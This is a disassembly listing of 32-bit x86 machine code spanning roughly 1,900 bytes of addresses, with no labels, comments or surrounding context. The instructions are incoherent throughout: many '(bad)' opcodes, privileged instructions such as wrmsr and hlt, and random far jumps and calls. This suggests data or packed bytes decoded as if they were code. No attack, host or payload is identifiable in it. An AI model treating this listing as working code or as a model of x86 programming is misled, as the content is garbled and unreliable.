  42bfe4:	mov    DWORD PTR [ecx+0x20484800],ecx
  42bfea:	push   DWORD PTR [edx-0x1]
  42bfed:	add    DWORD PTR [eax],0xffffffa2
  42bff0:	sbb    eax,0x9aff58
  42bff5:	inc    DWORD PTR [ebx-0x7cb21c20]
  42bffb:	mov    dl,0x0
  42bffd:	(bad)  
  42bffe:	push   DWORD PTR [esi+0x64]
  42c001:	sti    
  42c002:	int3   
  42c003:	sar    edi,1
  42c005:	inc    DWORD PTR [ebx-0xa60fc9]
  42c00b:	(bad)  
  42c00e:	add    BYTE PTR [ebx-0x24ffa3e4],ch
  42c014:	(bad)  
  42c015:	(bad)  
  42c016:	call   DWORD PTR [eax+esi*1]
  42c019:	call   0xff43641d
  42c01e:	add    eax,0xffffffa5
  42c021:	sbb    bh,bh
  42c023:	(bad)  
  42c026:	mov    DWORD PTR [eax-0x1e],ebx
  42c029:	call   DWORD PTR fs:[ebx+0x0]
  42c02d:	(bad)  
  42c02e:	inc    DWORD PTR [eax-0x1e007567]
  42c034:	(bad)  
  42c035:	inc    DWORD PTR [ebx-0x3335ccde]
  42c03b:	add    bh,bh
  42c03d:	inc    DWORD PTR [eax]
  42c03f:	call   0x244330ca
  42c044:	cmp    edi,0xffffffff
  42c047:	fs dec ebp
  42c049:	test   al,0xff
  42c04b:	test   BYTE PTR [eax],0xff
  42c04e:	jmp    FWORD PTR [edx]
  42c050:	sbb    eax,0xfffcffab
  42c055:	add    bh,bh
  42c057:	shr    DWORD PTR [ecx+0x45],1
  42c05a:	sub    edi,0xffffffcc
  42c05d:	inc    DWORD PTR [eax]
  42c05f:	inc    edx
  42c060:	mov    edi,0x8300ccb3
  42c065:	inc    DWORD PTR [eax]
  42c067:	and    ch,BYTE PTR [eax*1-0x8601]
  42c06e:	add    bl,dl
  42c070:	ret    
  42c071:	pop    ebp
  42c072:	add    BYTE PTR [edx-0x1],ch
  42c075:	add    bh,bh
  42c077:	lds    eax,FWORD PTR [edi-0xac0063]
  42c07d:	add    bh,bh
  42c07f:	jle    0x42c0f1
  42c081:	iret   
  42c082:	inc    DWORD PTR [ebp-0x7d]
  42c085:	(bad)  
  42c086:	jmp    DWORD PTR [edx+0x16003021]
  42c08c:	add    ah,cl
  42c08e:	add    BYTE PTR [edx+edx*1],al
  42c091:	mov    WORD PTR [eax],es
  42c093:	adc    al,0x83
  42c095:	int3   
  42c096:	mov    eax,edi
  42c098:	push   ebp
  42c099:	cmp    al,0x0
  42c09b:	xchg   ebx,eax
  42c09c:	(bad)  
  42c09d:	(bad)  
  42c09e:	call   DWORD PTR [edi]
  42c0a0:	push   cs
  42c0a1:	ja     0x42c0a3
  42c0a3:	(bad)  
  42c0a5:	dec    DWORD PTR [ecx-0x7cd81db7]
  42c0ab:	js     0x42c0ac
  42c0ad:	add    BYTE PTR [ecx+0x4335f6],cl
  42c0b3:	push   0xb689ff89
  42c0b8:	es pop ebx
  42c0ba:	(bad)  
  42c0bb:	cmp    edi,edi
  42c0bd:	(bad)  
  42c0be:	jmp    FWORD PTR [esp+ebx*8+0x5d]
  42c0c2:	jmp    FWORD PTR [edx-0x4400ff7d]
  42c0c8:	xchg   edx,eax
  42c0c9:	retf   
  42c0ca:	call   ebp
  42c0cc:	add    DWORD PTR [eax],0xffffffff
  42c0cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0d0:	fld    DWORD PTR [ebx]
  42c0d2:	jmp    FWORD PTR [esi+0x45890000]
  42c0d8:	add    edi,0xffffff89
  42c0db:	jl     0x42c0dc
  42c0dd:	mov    DWORD PTR [eax],eax
  42c0df:	sub    al,0x17
  42c0e1:	mov    DWORD PTR [bp-0x1],ebx
  42c0e5:	mov    DWORD PTR [ebx-0x333333ba],eax
  42c0eb:	int3   
  42c0ec:	int3   
  42c0ed:	int3   
  42c0ee:	int3   
  42c0ef:	int3   
  42c0f0:	jle    0x42c08b
  42c0f2:	inc    DWORD PTR [ebx-0xc617677]
  42c0f8:	sbb    BYTE PTR [ebp-0x1],0xff
  42c0fc:	inc    DWORD PTR [ebx+0x5f84da7c]
  42c102:	or     DWORD PTR [ecx-0x39500100],0xffffffac
  42c109:	jle    0x42c08e
  42c10b:	(bad)  
  42c10c:	(bad)  
  42c10d:	dec    DWORD PTR [edi-0x4231b6]
  42c113:	add    bh,bh
  42c115:	add    BYTE PTR [eax],dl
  42c117:	es je  0x42c170
  42c11a:	mov    edi,edi
  42c11c:	(bad)  
  42c11d:	call   FWORD PTR [ebp-0x54]
  42c120:	fldcw  WORD PTR [edx-0x1]
  42c123:	add    bh,bh
  42c125:	jmp    eax
  42c127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c128:	push   esp
  42c129:	or     al,BYTE PTR [eax]
  42c12b:	(bad)  
  42c12c:	(bad)  
  42c12d:	(bad)  
  42c12e:	cmp    ebx,DWORD PTR [edi-0x34]
  42c131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c132:	add    ah,cl
  42c134:	(bad)  
  42c135:	call   FWORD PTR [eax+0x60a17a]
  42c13b:	or     DWORD PTR [ecx-0x199b5101],0xffffffce
  42c142:	add    DWORD PTR [eax],0x0
  42c145:	call   FWORD PTR ds:0x89fdf5f0
  42c14b:	add    BYTE PTR [eax],al
  42c14d:	int3   
  42c14e:	xor    al,0xae
  42c150:	sbb    al,0xcb
  42c152:	inc    DWORD PTR [eax]
  42c154:	add    bh,bh
  42c156:	push   ss
  42c157:	outs   dx,BYTE PTR ds:[esi]
  42c158:	lahf   
  42c159:	mov    eax,0x8300ffff
  42c15e:	call   0xcd15a9db
  42c163:	inc    DWORD PTR [ebx-0x611f4401]
  42c169:	xlat   BYTE PTR ds:[ebx]
  42c16a:	mov    DWORD PTR [ebx+0x4e5f83cc],eax
  42c170:	dec    edx
  42c171:	or     ah,0xcc
  42c174:	(bad)  
  42c175:	inc    DWORD PTR [ebx-0x9f11a1]
  42c17b:	add    bh,bh
  42c17d:	add    BYTE PTR [ecx-0x7e],bh
  42c180:	fcomp  DWORD PTR [edi+0x0]
  42c183:	inc    DWORD PTR [eax]
  42c185:	jmp    DWORD PTR [ecx]
  42c187:	add    al,0x10
  42c189:	int    0x83
  42c18b:	add    bh,bh
  42c18d:	add    BYTE PTR [ebp-0xc25e59],dl
  42c193:	(bad)  
  42c194:	(bad)  
  42c195:	call   FWORD PTR [ecx-0x52ecbd]
  42c19b:	inc    DWORD PTR [ebx+0x46ed88ff]
  42c1a1:	xchg   DWORD PTR [eax],eax
  42c1a3:	add    bh,bh
  42c1a5:	int3   
  42c1a6:	add    al,0x76
  42c1a8:	sbb    ch,BYTE PTR [eax]
  42c1aa:	add    bh,bh
  42c1ac:	add    BYTE PTR [eax],al
  42c1ae:	(bad)  
  42c1af:	sbb    dl,ah
  42c1b1:	iret   
  42c1b2:	mov    esp,ecx
  42c1b4:	cmp    edi,0xffffffb1
  42c1b7:	js     0x42c210
  42c1b9:	aam    0x83
  42c1bb:	cmp    edi,0x0
  42c1be:	xchg   esp,eax
  42c1bf:	ret    
  42c1c0:	mov    ecx,0xffff0065
  42c1c5:	(bad)  
  42c1c6:	stc    
  42c1c7:	add    DWORD PTR [edx],0x838300f3
  42c1cd:	call   FWORD PTR [eax+0x7ad400]
  42c1d3:	add    bh,bh
  42c1d5:	add    BYTE PTR [edi],cl
  42c1d7:	mov    al,0xef
  42c1d9:	and    cl,BYTE PTR [ecx+0x26ff83ff]
  42c1df:	xchg   ebx,eax
  42c1e0:	xor    dh,BYTE PTR [ebx+0xffffff]
  42c1e6:	test   al,0x97
  42c1e8:	mov    ebp,0xff838981
  42c1ed:	int3   
  42c1ee:	daa    
  42c1ef:	fbld   TBYTE PTR [eax-0xff9d]
  42c1f5:	jmp    FWORD PTR [ecx+eax*8-0x69]
  42c1f9:	mov    cl,0xff
  42c1fb:	(bad)  
  42c1fc:	inc    DWORD PTR [eax]
  42c1fe:	pop    es
  42c1ff:	xchg   ebx,eax
  42c200:	pop    ecx
  42c201:	pop    esp
  42c202:	(bad)  
  42c203:	(bad)  
  42c204:	(bad)  
  42c205:	(bad)  
  42c206:	fnstcw WORD PTR [edx+0x36]
  42c209:	xor    al,0xff
  42c20b:	inc    DWORD PTR [ebx-0x578ddd01]
  42c211:	ud0    edi,edi
  42c214:	add    bh,bh
  42c216:	jns    0x42c267
  42c218:	pusha  
  42c219:	mov    cl,0x0
  42c21b:	(bad)  
  42c21c:	(bad)  
  42c21d:	(bad)  
  42c21e:	js     0x42c29d
  42c220:	sub    DWORD PTR [ebx],esi
  42c222:	(bad)  
  42c223:	inc    DWORD PTR [ebx-0x266bf801]
  42c229:	stos   BYTE PTR es:[edi],al
  42c22a:	add    BYTE PTR [eax],al
  42c22c:	int3   
  42c22d:	(bad)  
  42c22e:	cmp    DWORD PTR [eax],ebx
  42c230:	test   eax,0xff89838e
  42c235:	(bad)  
  42c236:	mov    esi,0x89020099
  42c23b:	add    bh,bh
  42c23d:	add    BYTE PTR [edx+0x8e416b],al
  42c243:	cmp    edi,0xffffffff
  42c246:	and    al,0x80
  42c248:	cmp    al,0xa5
  42c24a:	(bad)  
  42c24b:	(bad)  
  42c24c:	inc    DWORD PTR [eax]
  42c24e:	inc    edx
  42c24f:	fsubr  QWORD PTR [eax+edi*8-0x767c0100]
  42c256:	pop    eax
  42c257:	mov    dh,cl
  42c259:	cmp    bh,bh
  42c25b:	add    BYTE PTR [eax],al
  42c25d:	(bad)  
  42c25e:	fmul   QWORD PTR [ecx+ebp*1+0x5a]
  42c262:	(bad)  
  42c263:	(bad)  
  42c264:	inc    DWORD PTR [eax]
  42c266:	ret    
  42c267:	inc    eax
  42c268:	or     DWORD PTR [eax+0xff00ff],ecx
  42c26e:	out    0x18,al
  42c270:	add    esp,DWORD PTR [ebp+0x0]
  42c273:	add    bh,bh
  42c275:	push   esp
  42c277:	push   0x6e
  42c279:	xor    DWORD PTR [ecx-0x5c7c7601],ecx
  42c27f:	fs push 0xffcce7
  42c285:	(bad)  
  42c286:	mov    esi,0x89fd74d8
  42c28b:	mov    esp,ecx
  42c28d:	and    DWORD PTR [eax],0xffffffcf
  42c290:	fwait
  42c291:	or     al,BYTE PTR [eax]
  42c293:	add    BYTE PTR [eax],al
  42c295:	mov    DWORD PTR [eax+0x54],ebx
  42c298:	enter  0x83b0,0x89
  42c29c:	inc    DWORD PTR [eax]
  42c29e:	push   eax
  42c29f:	shr    BYTE PTR [edx],cl
  42c2a1:	test   ah,cl
  42c2a3:	(bad)  
  42c2a4:	inc    DWORD PTR [ebx+0x40beaf3b]
  42c2aa:	add    BYTE PTR [eax],al
  42c2ac:	cmp    edi,0x2a
  42c2af:	push   edi
  42c2b0:	in     eax,0xd4
  42c2b2:	add    DWORD PTR [eax],0xffffffff
  42c2b5:	(bad)  
  42c2b6:	jl     0x42c261
  42c2b8:	loope  0x42c2c3
  42c2ba:	inc    DWORD PTR [eax]
  42c2bc:	inc    DWORD PTR [ebx+0x5706b291]
  42c2c2:	(bad)  
  42c2c3:	inc    DWORD PTR [eax]
  42c2c5:	mov    DWORD PTR [ebx-0x50],ecx
  42c2c8:	cdq    
  42c2c9:	xchg   edi,edi
  42c2cb:	add    BYTE PTR [eax],al
  42c2cd:	push   DWORD PTR [eax-0xe76e8b]
  42c2d3:	(bad)  
  42c2d4:	inc    DWORD PTR [eax]
  42c2d6:	adc    esp,esi
  42c2d8:	ds loop 0x42c2db
  42c2db:	add    BYTE PTR [eax],al
  42c2dd:	int3   
  42c2de:	repnz out 0x35,eax
  42c2e1:	push   esi
  42c2e2:	cmp    edi,0xffffffff
  42c2e5:	sub    ecx,0xfffffff1
  42c2e8:	add    BYTE PTR [ebp-0x1],0x43
  42c2ef:	leave  
  42c2f0:	pop    edx
  42c2f1:	inc    esi
  42c2f2:	add    DWORD PTR [ebx+0x41f9ff00],0x6a
  42c2f9:	mov    bh,0xff
  42c2fb:	(bad)  
  42c2fc:	(bad)  
  42c2fd:	(bad)  
  42c2fe:	mov    edi,0xff33b643
  42c303:	cmp    edi,0xffffffff
  42c306:	cmp    eax,0xf39917
  42c30b:	add    bh,bh
  42c30d:	inc    DWORD PTR [eax]
  42c30f:	push   eax
  42c310:	scas   eax,DWORD PTR es:[edi]
  42c311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c312:	int3   
  42c313:	dec    esp
  42c315:	adc    DWORD PTR [ebp-0xe550f8],0x0
  42c31c:	cmp    edi,0x46
  42c31f:	mov    ecx,0x979b
  42c324:	inc    DWORD PTR [eax]
  42c326:	mov    ebp,0x8377df3f
  42c32b:	mov    edi,edi
  42c32d:	add    BYTE PTR [edi-0x7cc41263],dl
  42c333:	add    BYTE PTR [eax],al
  42c335:	add    dl,ch
  42c337:	jle    0x42c302
  42c339:	and    edi,edi
  42c33b:	inc    DWORD PTR [eax]
  42c33d:	sbb    DWORD PTR [edx-0xd1f541],0xffffffff
  42c344:	add    bh,bh
  42c346:	xchg   ebp,eax
  42c347:	jmp    0x41e981
  42c34c:	int3   
  42c34d:	call   DWORD PTR [esi]
  42c34f:	add    dl,BYTE PTR ds:0xcc83000f
  42c355:	add    BYTE PTR [edx+ebp*2-0xff4a02],bh
  42c35c:	inc    DWORD PTR [ebx+0x12268297]
  42c362:	inc    DWORD PTR [eax]
  42c364:	cmp    edi,0xffffff93
  42c367:	dec    eax
  42c368:	xchg   esp,eax
  42c369:	out    dx,eax
  42c36a:	inc    DWORD PTR [eax]
  42c36c:	add    bh,bh
  42c36e:	mov    ebx,0x89d30782
  42c373:	(bad)  
  42c374:	inc    DWORD PTR [eax]
  42c376:	imul   esi,ebp,0xffff3497
  42c37c:	cmp    edi,0x8
  42c37f:	or     eax,0xccccb80a
  42c384:	add    BYTE PTR [ebx-0x71b1cb9c],al
  42c38a:	add    DWORD PTR [eax],0xffffffff
  42c38d:	add    BYTE PTR [eax+0x5f],bh
  42c390:	shl    BYTE PTR [ecx-0x7d],1
  42c396:	fwait
  42c397:	mov    bl,0xe0
  42c399:	dec    ebp
  42c39a:	int3   
  42c39b:	inc    DWORD PTR [eax]
  42c39d:	push   DWORD PTR [ecx+0xa961e7]
  42c3a3:	(bad)  
  42c3a4:	(bad)  
  42c3a5:	dec    DWORD PTR [ebp-0x56]
  42c3a8:	hlt    
  42c3a9:	sar    edi,1
  42c3ab:	add    ah,cl
  42c3ad:	sbb    edx,0xffffffeb
  42c3b0:	jle    0x42c406
  42c3b2:	add    BYTE PTR [eax],al
  42c3b4:	inc    DWORD PTR [eax]
  42c3b6:	mov    ebx,0x83c73168
  42c3bb:	(bad)  
  42c3bc:	inc    DWORD PTR [ebx-0x20a0171e]
  42c3c2:	int3   
  42c3c3:	int3   
  42c3c4:	add    bh,bh
  42c3c6:	mov    ebp,0xffffc3dd
  42c3cb:	or     esp,0xffffffcc
  42c3ce:	inc    edi
  42c3cf:	jns    0x42c384
  42c3d1:	sahf   
  42c3d2:	(bad)  
  42c3d3:	dec    DWORD PTR [ecx-0x2571157d]
  42c3d9:	ins    DWORD PTR es:[edi],dx
  42c3da:	inc    DWORD PTR [eax]
  42c3dc:	dec    esp
  42c3de:	gs sahf 
  42c3e0:	mov    ds:0xffdd,al
  42c3e5:	int3   
  42c3e6:	(bad)  
  42c3e7:	das    
  42c3e8:	ins    BYTE PTR es:[edi],dx
  42c3e9:	ror    ah,0x89
  42c3ec:	inc    DWORD PTR [eax]
  42c3ee:	rol    DWORD PTR [edx-0x7c00be69],1
  42c3f4:	add    BYTE PTR [eax],al
  42c3f6:	add    BYTE PTR [eax-0x7c47d2],al
  42c3fc:	int3   
  42c3fd:	add    cl,ah
  42c3ff:	dec    esi
  42c400:	(bad)  
  42c401:	scas   eax,DWORD PTR es:[edi]
  42c402:	or     esp,0xffffffff
  42c405:	add    BYTE PTR [edx-0x7a],bh
  42c408:	or     BYTE PTR [bx+si],al
  42c40b:	mov    DWORD PTR [eax],eax
  42c40d:	(bad)  
  42c40e:	fst    QWORD PTR [eax]
  42c410:	fucom  st(1)
  42c412:	add    DWORD PTR [eax],0xffffffff
  42c415:	call   DWORD PTR [ebp-0x3388a56a]
  42c41b:	mov    DWORD PTR [ebx+0x4c0222ff],eax
  42c421:	or     edi,edi
  42c423:	add    ah,cl
  42c425:	inc    DWORD PTR [eax+0x13b838]
  42c42b:	add    bh,bh
  42c42d:	cmp    DWORD PTR [esi+ebx*2],0xffffffdb
  42c431:	loopne 0x42c432
  42c433:	cmp    edi,0xffffffcc
  42c436:	wrmsr  
  42c438:	jle    0x42c452
  42c43a:	inc    DWORD PTR [eax]
  42c43c:	inc    DWORD PTR [eax]
  42c43e:	retf   0xee0d
  42c441:	(bad)  
  42c442:	(bad)  
  42c443:	inc    DWORD PTR [eax]
  42c445:	(bad)  
  42c446:	jmp    0x42c3e9
  42c448:	pop    edx
  42c449:	add    edi,edi
  42c44b:	or     esp,0xffffffcc
  42c44e:	repnz fst DWORD PTR [ebp-0x20]
  42c455:	add    BYTE PTR [ecx+0x4db948],al
  42c45b:	mov    DWORD PTR [eax],eax
  42c45d:	jmp    FWORD PTR [edi+esi*8]
  42c460:	fiadd  DWORD PTR [ebx-0x7c0077]
  42c466:	cs hlt 
  42c468:	in     al,0x67
  42c46a:	add    bh,bh
  42c46c:	(bad)  
  42c46d:	(bad)  
  42c46e:	(bad)  
  42c46f:	pop    edi
  42c470:	jbe    0x42c419
  42c472:	inc    DWORD PTR [eax]
  42c474:	add    bh,bh
  42c476:	jnp    0x42c4cd
  42c478:	test   DWORD PTR [edi-0x76ff3301],ebx
  42c47e:	inc    esp
  42c47f:	inc    ecx
  42c480:	scas   eax,DWORD PTR es:[edi]
  42c481:	sbb    al,0x89
  42c483:	dec    esp
  42c485:	int3   
  42c486:	jno    0x42c432
  42c488:	cmp    ecx,DWORD PTR [edi-0x1]
  42c48b:	add    BYTE PTR [ebx+0x5a7d2889],al
  42c491:	add    edi,edi
  42c493:	(bad)  
  42c494:	inc    DWORD PTR [eax]
  42c496:	xor    BYTE PTR [edx],ch
  42c498:	jecxz  0x42c497
  42c49a:	add    DWORD PTR [eax],0xffffffff
  42c49d:	inc    DWORD PTR [eax]
  42c49f:	ret    0x72d7
  42c4a2:	cmp    edi,0xffffffff
  42c4a5:	add    BYTE PTR [ebx-0xedef6],dl
  42c4ab:	(bad)  
  42c4ac:	inc    DWORD PTR [eax]
  42c4ae:	sbb    BYTE PTR [ecx-0xffa992],ah
  42c4b4:	mov    edi,edi
  42c4b6:	sahf   
  42c4b7:	daa    
  42c4b8:	scas   eax,DWORD PTR es:[edi]
  42c4b9:	adc    al,BYTE PTR [eax]
  42c4bb:	inc    DWORD PTR [ebx+0x627deff]
  42c4c1:	lea    ecx,[ecx+0x1089ffff]
  42c4c7:	(bad)  
  42c4c8:	outs   dx,BYTE PTR ds:[esi]
  42c4c9:	(bad)  
  42c4cc:	add    DWORD PTR [eax],0x6f
  42c4cf:	xlat   BYTE PTR ds:[ebx]
  42c4d0:	nop
  42c4d1:	or     cl,BYTE PTR [ecx+0x690000ff]
  42c4d7:	jnp    0x42c4cd
  42c4d9:	retf   
  42c4da:	add    bh,bh
  42c4dc:	add    ah,cl
  42c4de:	in     al,dx
  42c4df:	adc    DWORD PTR [edx+0xffff7d],eax
  42c4e5:	int3   
  42c4e6:	cmp    ah,BYTE PTR [ebp-0x330034d8]
  42c4ec:	(bad)  
  42c4ed:	dec    DWORD PTR [edi+0x5c]
  42c4f0:	adc    esp,edi
  42c4f2:	int3   
  42c4f3:	cmp    edi,0xffffffff
  42c4f6:	call   0x83:0x11ac30
  42c4fd:	dec    DWORD PTR [ecx+ebp*1]
  42c500:	je     0x42c4be
  42c502:	add    DWORD PTR [ebx+0x5f24ffff],0x63
  42c509:	mov    ds:0x830083,eax
  42c50e:	dec    edx
  42c50f:	mov    ebx,0xffff9895
  42c514:	add    BYTE PTR [ebx+0x6bb7f0f],al
  42c51a:	int3   
  42c51b:	inc    DWORD PTR [eax]
  42c51d:	inc    DWORD PTR [esi]
  42c51f:	bound  ecx,QWORD PTR [ecx]
  42c521:	sahf   
  42c522:	add    BYTE PTR [ebx-0x12e7ff01],al
  42c528:	cmp    dl,BYTE PTR [esi+0x0]
  42c52b:	add    BYTE PTR [eax],al
  42c52d:	add    BYTE PTR [edi],bl
  42c52f:	ss jp  0x42c4c0
  42c532:	add    bh,bh
  42c534:	add    BYTE PTR [ebx-0x4132188c],al
  42c53a:	cmp    edi,0xffffffff
  42c53d:	call   FWORD PTR [esi]
  42c53f:	xchg   ecx,eax
  42c540:	mov    cl,0x2d
  42c542:	add    BYTE PTR [ebx+0x2407cc00],al
  42c548:	mov    edi,0xccccec
  42c54d:	int3   
  42c54e:	push   ebx
  42c54f:	call   0x421a76
  42c554:	inc    DWORD PTR [eax]
  42c556:	xlat   BYTE PTR ds:[ebx]
  42c557:	jmp    0x42c528
  42c559:	xor    DWORD PTR [ebx+0x4600ff00],eax
  42c55f:	add    BYTE PTR [edx-0xff0078],ch
  42c565:	dec    DWORD PTR [edi]
  42c567:	pop    ecx
  42c568:	jnp    0x42c539
  42c56a:	(bad)  
  42c56b:	inc    DWORD PTR [eax]
  42c56d:	jmp    FWORD PTR [edx]
  42c56f:	mov    eax,0xff0f35
  42c574:	add    bh,bh
  42c576:	push   esp
  42c577:	jns    0x42c555
  42c579:	cmp    edi,edi
  42c57b:	mov    DWORD PTR [eax],eax
  42c57d:	sbb    DWORD PTR [edi-0x53],0x66
  42c581:	xchg   ebp,eax
  42c582:	int3   
  42c583:	dec    esp
  42c585:	cmp    DWORD PTR ds:0x250bb7,0xffffffcc
  42c58c:	add    bh,bh
  42c58e:	sbb    bl,0xf5
  42c591:	icebp  
  42c592:	(bad)  
  42c593:	inc    DWORD PTR [eax]
  42c595:	add    BYTE PTR ds:0xcc914109,ch
  42c59b:	inc    DWORD PTR [eax]
  42c59d:	add    BYTE PTR [eax-0xf24080],bh
  42c5a3:	inc    DWORD PTR [eax]
  42c5a5:	int3   
  42c5a6:	popa   
  42c5a7:	retf   
  42c5a8:	push   ss
  42c5a9:	cmp    edi,edi
  42c5ab:	inc    DWORD PTR [ebx+0xbc5f900]
  42c5b1:	dec    ebx
  42c5b2:	add    BYTE PTR [eax],al
  42c5b4:	inc    DWORD PTR [ebx+0x6fcbd5d6]
  42c5ba:	(bad)  
  42c5bb:	(bad)  
  42c5bc:	dec    esp
  42c5be:	lods   al,BYTE PTR ds:[esi]
  42c5bf:	loopne 0x42c619
  42c5c1:	push   edx
  42c5c2:	dec    DWORD PTR [ecx+0x34d30000]
  42c5c8:	fcomi  st,st(1)
  42c5ca:	dec    esp
  42c5cc:	add    bh,bh
  42c5ce:	pop    ebp
  42c5cf:	inc    ebx
  42c5d0:	sbb    ch,dl
  42c5d2:	dec    DWORD PTR [ecx+0x6ca6ff00]
  42c5d8:	or     DWORD PTR [edx],0xccff00ff
  42c5de:	jbe    0x42c60d
  42c5e0:	outs   dx,BYTE PTR ds:[esi]
  42c5e1:	mov    es,WORD PTR [eax]
  42c5e3:	inc    DWORD PTR [ebx-0x25e35701]
  42c5e9:	jmp    0xcc42c6ed
  42c5ee:	dec    esp
  42c5ef:	stos   DWORD PTR es:[edi],eax
  42c5f0:	pop    ebp
  42c5f1:	call   0x42c6f5
  42c5f6:	(bad)  
  42c5f7:	aas    
  42c5f8:	fs call 0xe4aa:0xccffffff
  42c600:	dec    eax
  42c601:	xor    eax,DWORD PTR [eax]
  42c603:	add    BYTE PTR [eax],al
  42c605:	int3   
  42c606:	jne    0x42c5e1
  42c608:	fidivr DWORD PTR [eax+0x0]
  42c60b:	(bad)  
  42c60c:	inc    DWORD PTR [eax]
  42c60e:	xchg   esp,eax
  42c60f:	jns    0x42c669
  42c611:	xchg   BYTE PTR [eax],al
  42c613:	add    ah,cl
  42c615:	mov    edx,edx
  42c617:	cmp    cl,BYTE PTR [edi-0x760077]
  42c61d:	int3   
  42c61e:	jae    0x42c64a
  42c620:	jno    0x42c605
  42c622:	cmp    edi,0x0
  42c625:	add    DWORD PTR [ebp+0x13626c],0xffffff83
  42c62c:	add    ah,cl
  42c62e:	cli    
  42c62f:	dec    eax
  42c630:	jnp    0x42c689
  42c632:	mov    edi,edi
  42c634:	mov    DWORD PTR [eax],eax
  42c636:	jge    0x42c63a
  42c638:	in     eax,0x22
  42c63a:	inc    DWORD PTR [eax]
  42c63c:	add    bh,bh
  42c63e:	fsub   DWORD PTR [edx-0x3c]
  42c641:	lock (bad) 
  42c643:	(bad)  
  42c644:	(bad)  
  42c645:	(bad)  
  42c646:	in     eax,dx
  42c647:	mov    ds:0xffbf5e,eax
  42c64c:	cmp    edi,0xffffffa4
  42c64f:	ins    BYTE PTR es:[edi],dx
  42c650:	sub    eax,0xff00ffc9
  42c655:	add    BYTE PTR [ebp+0x1],ah
  42c658:	out    dx,al
  42c659:	cs dec esp
  42c65c:	add    bh,bh
  42c65e:	out    0x4d,eax
  42c660:	out    0x39,al
  42c662:	(bad)  
  42c663:	(bad)  
  42c664:	inc    DWORD PTR [eax]
  42c666:	pusha  
  42c667:	cmp    al,0xfb
  42c669:	inc    esi
  42c66a:	inc    DWORD PTR [eax]
  42c66c:	int3   
  42c66d:	jmp    DWORD PTR [esi+0x1b575b]
  42c673:	(bad)  
  42c674:	inc    DWORD PTR [eax]
  42c676:	xchg   ebx,eax
  42c677:	push   esi
  42c678:	mov    ds:0xff00ff5a,al
  42c67d:	and    edx,0x1d
  42c680:	pop    ss
  42c681:	retf   
  42c682:	(bad)  
  42c683:	(bad)  
  42c684:	inc    DWORD PTR [eax]
  42c686:	sbb    BYTE PTR [edi-0xe96f],0x83
  42c68d:	(bad)  
  42c68e:	cmp    DWORD PTR [eax-0x5d],ecx
  42c691:	or     BYTE PTR [eax],al
  42c693:	add    bh,bh
  42c695:	jmp    ecx
  42c697:	add    al,0x31
  42c699:	dec    edi
  42c69a:	add    bh,bh
  42c69c:	inc    DWORD PTR [eax]
  42c69e:	aaa    
  42c69f:	inc    ebx
  42c6a0:	gs push cs
  42c6a2:	cmp    edi,0xffffffff
  42c6a5:	call   ecx
  42c6a7:	loop   0x42c6f3
  42c6a9:	mov    ah,0xff
  42c6ab:	add    BYTE PTR [ecx-0x6636e01],cl
  42c6b1:	out    0x0,al
  42c6b3:	int3   
  42c6b4:	cmp    edi,0x4e
  42c6b7:	jge    0x42c686
  42c6b9:	out    dx,eax
  42c6ba:	inc    DWORD PTR [eax]
  42c6bc:	add    ah,cl
  42c6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6bf:	mov    esi,0xff83d692
  42c6c4:	inc    DWORD PTR [eax]
  42c6c6:	and    al,0x3
  42c6c8:	lock push ds
  42c6ca:	dec    esp
  42c6cc:	add    BYTE PTR [eax],al
  42c6ce:	cmp    bl,BYTE PTR [edx]
  42c6d0:	pop    ecx
  42c6d1:	inc    BYTE PTR [ebx-0x44007c34]
  42c6d7:	mov    ds,eax
  42c6d9:	push   ebp
  42c6da:	(bad)  
  42c6db:	dec    esp
  42c6dd:	mov    edi,esp
  42c6df:	jne    0x42c6fb
  42c6e1:	push   esp
  42c6e2:	inc    DWORD PTR [ebx+0x31dbff83]
  42c6e8:	sub    ecx,esi
  42c6ea:	inc    DWORD PTR [eax]
  42c6ec:	inc    DWORD PTR [eax]
  42c6ee:	popf   
  42c6ef:	mov    DWORD PTR [ebp-0x337c0018],esp
  42c6f5:	push   DWORD PTR [esi+0xd7429a]
  42c6fb:	add    BYTE PTR [ecx+0x41aabff],cl
  42c701:	call   0x42c705
  42c706:	(bad)  
  42c707:	and    bl,BYTE PTR [eax]
  42c709:	inc    DWORD PTR [eax]
  42c70b:	add    ah,cl
  42c70d:	(bad)  
  42c70e:	mov    ebx,0x8348e941
  42c713:	int3   
  42c714:	dec    DWORD PTR [ecx+0x4058ffe8]
  42c71a:	inc    DWORD PTR [eax]
  42c71c:	add    bh,bh
  42c71e:	adc    BYTE PTR [ebx],al
  42c720:	gs aam 0x89
  42c723:	mov    edi,edi
  42c725:	int3   
  42c726:	ins    BYTE PTR es:[edi],dx
  42c727:	mov    gs,edi
  42c729:	pop    esp
  42c72a:	inc    DWORD PTR [eax]
  42c72c:	add    BYTE PTR [ebx-0x263b5c9c],al
  42c732:	cmp    edi,0xffffffff
  42c735:	(bad)  
  42c736:	call   0x758f58
  42c73b:	(bad)  
  42c73c:	(bad)  
  42c73d:	push   DWORD PTR [esi+0x6f]
  42c740:	pop    ecx
  42c741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c742:	inc    DWORD PTR [eax]
  42c744:	(bad)  
  42c745:	inc    DWORD PTR [edi+0x9]
  42c748:	leave  
  42c749:	rol    DWORD PTR [eax],0xff
  42c74c:	add    BYTE PTR [ebx+0x7c24857],al
  42c752:	mov    DWORD PTR [eax],eax
  42c754:	(bad)  
  42c755:	push   edi
  42c757:	jnp    0x42c74f
  42c759:	mov    eax,0xffffffff
  42c75e:	ror    DWORD PTR [ebp+0x83b867],cl
  42c764:	mov    DWORD PTR [eax],eax
  42c766:	ins    DWORD PTR es:[edi],dx
  42c767:	(bad)  
  42c768:	push   esp
  42c769:	jne    0x42c76a
  42c76b:	add    bh,bh
  42c76d:	or     DWORD PTR [ebp+0x78],0xffffffd9
  42c771:	cmp    bh,0xff
  42c774:	add    BYTE PTR [eax],al
  42c776:	and    BYTE PTR [ecx],dl
  42c778:	jbe    0x42c72c
  42c77a:	add    BYTE PTR [eax],al
  42c77c:	add    bh,bh
  42c77e:	cmp    bl,bl
  42c780:	xchg   ecx,eax
  42c781:	cwde   
  42c782:	add    BYTE PTR [eax],al
  42c784:	inc    DWORD PTR [eax]
  42c786:	dec    edx
